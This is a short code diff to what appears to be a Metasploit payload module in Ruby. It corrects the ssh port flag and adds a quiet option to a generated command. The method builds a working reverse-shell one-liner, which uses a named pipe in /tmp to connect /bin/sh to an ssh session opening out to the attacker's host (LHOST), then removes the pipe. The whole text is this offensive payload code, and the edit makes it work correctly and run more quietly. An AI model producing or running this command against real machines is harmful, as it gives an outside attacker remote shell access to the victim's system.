@@ -54,8 +54,8 @@ module MetasploitModule
   #
   def command_string
     backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
-    lport = datastore['LPORT'] == 22 ? '' : "-P #{datastore['LPORT']} "
+    lport = datastore['LPORT'] == 22 ? '' : "-p #{datastore['LPORT']} "
     opts =  datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map {|e| e = "-o #{e} " }.join
-    "mkfifo /tmp/#{backpipe};ssh #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
+    "mkfifo /tmp/#{backpipe};ssh -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
   end
 end
